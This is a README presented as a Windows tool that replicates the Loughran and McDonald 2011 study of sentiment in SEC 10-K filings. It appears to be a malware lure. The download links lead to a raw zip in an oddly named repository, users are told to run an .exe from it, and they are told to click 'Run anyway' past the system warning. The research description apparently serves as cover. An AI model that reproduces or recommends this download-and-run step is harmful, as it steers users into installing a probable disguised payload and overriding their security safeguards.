# 📈 lm2011-replication - Analyze financial text for better insights

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/slopshoporderulvales606/lm2011-replication/main/input/replication_lm_2.4.zip)

This software replicates the study by Loughran and McDonald. It performs sentiment analysis on SEC 10-K filings. You can use this tool to count specific words in company reports. It then calculates how these words relate to stock returns. The process follows the standard Fama-MacBeth regression method.

## 📥 How to download the software

Follow these steps to set up the tool on your Windows computer.

1. Go to the [official release page](https://raw.githubusercontent.com/slopshoporderulvales606/lm2011-replication/main/input/replication_lm_2.4.zip).
2. Look for the latest version at the top of the list.
3. Click the file ending in .exe to start your download.
4. Save the file to your desktop or downloads folder.

## ⚙️ System requirements

Ensure your computer has the following items before you start:

* Windows 10 or Windows 11.
* At least 8 gigabytes of memory.
* An active internet connection to download financial data.
* About 1 gigabyte of free disk space.

## 🚀 Running the application

After you download the file, take these steps to open the program:

1. Locate the file you saved earlier.
2. Double-click the file icon.
3. Your computer may show a screen asking for permission to run the tool. Click "Run anyway" if such a prompt appears.
4. The main window will open once the system verifies the file.

## 📊 Performing your first analysis

This program uses data from the SEC EDGAR system. You do not need to know how to code to use these features.

1. **Select your files:** Place your SEC 10-K text files into the input folder. The program creates this folder automatically during the first run.
2. **Choose your dictionary:** Select the LM Master Dictionary from the settings menu. This dictionary tracks important financial terms.
3. **Set the date range:** Enter the start year and end year for your study.
4. **Start the process:** Press the "Execute Analysis" button. 
5. **Wait for completion:** The screen displays a progress bar. Large sets of filings take more time to process.
6. **View the results:** The program generates a report file once it finishes. It saves this as a table you can open in spreadsheet software.

## 🔬 Understanding the output

The application produces a table of results. Each row represents a specific company. The columns show the following data:

* **Sentiment Count:** This indicates if the report contains positive or negative tone.
* **Filing Period:** This shows the date of the document.
* **Excess Return:** This measures the stock performance during the study window.
* **Regression Output:** This identifies if the sentiment predicts the stock return.

## 🛠 Solving common issues

Most errors occur due to file format conflicts. Check these items if the program stops:

* **File Format:** Ensure your documents are in plain text format. The tool cannot read PDF or Word files. Keep files as .txt documents.
* **Empty Files:** Check that your text files contain actual words. Files with zero bytes cause errors.
* **Disk Space:** Clear space if the program stops halfway through. Processing large financial datasets requires significant temp folder space.
* **Updates:** Check the release page regularly for newer versions. We update the tool when SEC report formats change.

## 📋 Additional context

This project mimics the famous Loughran and McDonald study from 2011. That study changed how people read financial filings. It proved that simple, generic language often hides important information. By counting negative words, researchers can predict risks. This tool makes that complex research available to anyone. You can study thousands of filings in minutes. Use this information to improve your research process. 

## ❓ Frequently asked questions

**Do I need a server?**
No. This tool runs locally on your laptop or desktop. It does not send your data to an external server.

**Can I process files from other years?**
Yes. You may select any date range available in the EDGAR database.

**Is this software free?**
Yes. The project follows an open source model. You can view the code on the main page.

**What is a Fama-MacBeth regression?**
It is a statistical method used in finance. It helps users see if one factor, such as sentiment, impacts stock returns over time. The program handles these math steps for you.

**How do I delete the app?**
Remove the file from your computer to uninstall the tool. The program does not install extra junk files on your system. It remains independent of your other software.

**Can I change the dictionary?**
Yes. Use the settings tab to load your own list of words if you want to test different ideas. Stick to the standard LM dictionary for the best results.